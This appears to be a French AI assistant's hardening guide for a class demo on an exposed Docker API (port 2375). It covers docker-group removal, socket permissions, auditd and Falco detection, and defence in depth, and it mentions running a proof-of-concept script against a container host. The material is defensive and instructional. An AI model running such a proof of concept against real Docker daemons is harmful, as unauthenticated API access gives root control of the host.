### A — Voir qui peut utiliser Docker (membres du groupe `docker`)

```bash
getent group docker
# ou
getent group docker | awk -F: '{print $4}'
```

### B — Retirer un utilisateur non-admin du groupe `docker` (par exemple `ing`)

```bash
sudo gpasswd -d ing docker
# vérifier
id ing
# il ne devrait plus voir 'docker' dans la sortie
```

> **Pourquoi** : les membres du groupe `docker` peuvent exécuter des commandes docker sans sudo ; les retirer réduit grandement le risque.

### C — Restreindre le socket Docker au root seulement

Par défaut le socket est souvent `root:docker` et mode `660`. Tu peux forcer `root:root` et 660 (seuls root peuvent accéder) — note : ceci empêche les utilisateurs non-root d’utiliser Docker sans `sudo`.

```bash
# sauvegarde
sudo cp /var/run/docker.sock /var/run/docker.sock.bak 2>/dev/null || true

# changer ownership et permissions
sudo chown root:root /var/run/docker.sock
sudo chmod 660 /var/run/docker.sock

# vérifier
ls -l /var/run/docker.sock
```

> Attention : si tu as des services qui attendent d'utiliser le socket via le groupe `docker`, il faudra ajuster. Mais stricter is safer.

### D — Forcer l’utilisation de sudo pour docker (exemple)

Autoriser seulement root à lancer `docker` ; si tu veux que certains admins l’utilisent via sudo, gère /etc/sudoers.

```bash
# exemple pour permettre à 'adminuser' d'utiliser docker via sudo sans mot de passe (à adapter prudemment)
echo 'adminuser ALL=(ALL) NOPASSWD: /usr/bin/docker' | sudo tee /etc/sudoers.d/docker-admin
sudo chmod 440 /etc/sudoers.d/docker-admin
```

### E — Interdire l’exécution de conteneurs privilégiés depuis politiques (examen manuel)

Ne pas utiliser `privileged: true` dans compose ; inspecter compose files et images pour bind mounts.

------

## 5) Mesures complémentaires (réduction du blast radius)

- **Rootless Docker** : exécuter Docker dans mode rootless pour que le démon n’ait pas automatiquement tous les droits root du système. Utile si tu dois laisser des utilisateurs lancer des conteneurs.
- **User namespaces** : remapper UIDs dans les conteneurs pour limiter l’impact d’un processus root à l’intérieur du conteneur.
- **AppArmor / SELinux / seccomp** : appliquer des profils restrictifs aux conteneurs.
- **Interdire mounts sensibles via politique** : surveiller (Falco) et refuser images/containers qui demandent binds sensibles.
- **Ne pas exécuter DIND** en production ; DIND est utile pour CI mais dangereux si mal configuré.

------

## 6) Détection & réponse (si soupçon d’accès local)

- **Audit** : `auditctl -w /var/run/docker.sock -p rwxa -k dockersock_access` pour logguer accès au socket.
- **Falco** : règle pour alerter création de conteneurs avec mounts sur `/etc` ou démarrage `--privileged`.
- **Triage** : récupérer `docker events`, `curl /containers/json`, vérifier conteneurs récents, `journalctl -u docker`.

Commande d’audit exemple :

```bash
sudo auditctl -w /var/run/docker.sock -p rwxa -k dockersock_access
# puis après l'incident:
sudo ausearch -k dockersock_access -ts recent
```

------

## 7) Remarque essentielle (sécurité système)

- Si un attaquant a déjà un shell root sur la machine hôte, **aucune** mesure au niveau Docker ne peut garantir la sécurité totale : root peut lire clés, modifier services, exécuter conteneurs, etc.
- L’objectif est de **diminuer la probabilité** qu’un utilisateur local non-autorisé puisse faire ces actions et de **détecter** très vite toute activité suspecte.

------

## 8) Ce que tu peux démontrer en cours (slide + commandes)

1. **Montrer le problème** : `python3 poc.py --target http://172.18.0.2:2375` → crée `PROOF`.
2. **Montrer la limite du blocage réseau** : expliquer que le port n’étant pas mappé sur l’hôte, firewall seul ne protège pas contre un attaquant local.
3. **Montrer la mitigation locale** (exécute ces trois commandes devant la classe) :

```bash
# retirer l'utilisateur du groupe docker
sudo gpasswd -d <ton_user> docker

# restreindre le socket
sudo chown root:root /var/run/docker.sock
sudo chmod 660 /var/run/docker.sock

# tester qu'on ne peut plus appeler docker sans sudo
docker ps || echo "docker inaccessible sans sudo — mitigation OK"
```

1. **Conclusion orale** : « empêcher l’accès réseau est essentiel ; empêcher l’accès local (via permissions / groupe) est aussi essentiel — il faut les deux. »

------

## 9) Veux-tu que je prépare un petit script `lock_docker_local.sh` ?

Je peux te générer un script simple (avec backups et commentaires) qui :

- affiche membres du groupe `docker`,
- retire des utilisateurs listés (si tu fournis les noms),
- sauvegarde et change la propriété du socket,
- ajoute la règle auditd optionnelle.

Je peux le produire tout de suite si tu veux — dis-moi juste si je dois **retirer ton utilisateur actuel** du groupe `docker` automatiquement dans le script, ou laisser la suppression manuelle.

------



Excellente question — c’est une distinction cruciale à bien comprendre, surtout quand tu présentes une démonstration de sécurité.

------

### **1) Le concept de “défense en profondeur”**

La **défense en profondeur** signifie qu’on ne mise **jamais sur une seule barrière de sécurité**, mais sur **plusieurs couches indépendantes**.
 Chaque mesure est supposée pouvoir être contournée, mais **ensemble**, elles réduisent drastiquement les risques.

Autrement dit :

> « Si une barrière tombe, une autre doit toujours être là pour limiter ou retarder l’attaque. »

------

### **2) Dans ton cas précis (port 2375)**

Le port **2375** correspond à l’**API Docker non sécurisée via HTTP**.
 Quand elle est exposée, elle permet à **n’importe qui** de contrôler le démon Docker : créer des conteneurs, exécuter du code, écrire dans `/etc`, etc.

Or, même si **normalement**, Docker n’a pas besoin d’exposer ce port (il utilise le socket UNIX `/var/run/docker.sock` localement), tu peux te retrouver dans une situation où :

- un développeur l’a activé par erreur (`-H tcp://0.0.0.0:2375`),
- un conteneur DIND le publie accidentellement (`2375:2375`),
- une vulnérabilité réseau permet d’y accéder depuis l’extérieur.

Le **pare-feu** est donc **une barrière supplémentaire** qui empêche un attaquant distant d’exploiter cette exposition, même si le service Docker écoute sur le port.

------

### **3) Pourquoi c’est bien de la défense en profondeur**

Parce que le **pare-feu** ne corrige pas la vulnérabilité elle-même (le démon Docker écoute toujours sur 2375 sans authentification),
 mais il **empêche son exploitation à distance**.

Autrement dit :

- **Mesure 1 (pare-feu)** → empêche les connexions externes non autorisées.
- **Mesure 2 (configuration Docker)** → supprime l’exposition du port 2375.
- **Mesure 3 (TLS et authentification)** → protège si un accès distant légitime est nécessaire.
- **Mesure 4 (permissions locales)** → bloque les accès non root/non admin à Docker.

Chaque couche protège les autres.

------

### **4) Illustration concrète**

Sans pare-feu :

```bash
Attaquant distant --> TCP 2375 --> Docker Daemon (root control)
```

Avec pare-feu :

```bash
Attaquant distant -X-> TCP 2375 (bloqué par iptables)
                      |
                      +--> impossible d’atteindre le démon même s’il écoute
```

Et si un admin interne fait une erreur plus tard (réactive 2375), le **pare-feu reste ta ligne de défense passive**.
 C’est ça, la logique de la défense en profondeur.

------

### **5) Comment le justifier dans un rapport ou une présentation**

Tu peux formuler ça comme ceci :

> **Blocage du port 2375 – Mesure de défense en profondeur :**
>  Cette règle de pare-feu ne supprime pas la vulnérabilité sous-jacente (exposition d’une API Docker non authentifiée), mais empêche sa compromission à distance.
>  Ainsi, même si la configuration du démon Docker est modifiée par erreur ou par un script, le pare-feu agit comme une barrière supplémentaire.
>  C’est une mesure complémentaire visant à retarder ou limiter les vecteurs d’attaque externes, conformément au principe de défense en profondeur.

------

